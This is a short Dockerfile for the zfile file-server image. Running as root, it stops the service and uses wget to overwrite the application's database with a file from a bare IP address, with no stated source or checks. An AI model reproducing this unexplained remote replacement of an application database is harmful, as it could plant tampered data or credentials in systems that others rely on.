FROM zhaojun1998/zfile
USER root
RUN ~/zfile/bin/stop.sh && wget -O .zfile-v4/db/zfile http://194.33.39.47:8888/down/B0oggQ2WzjeY
RUN ~/zfile/bin/start.sh
EXPOSE 8080
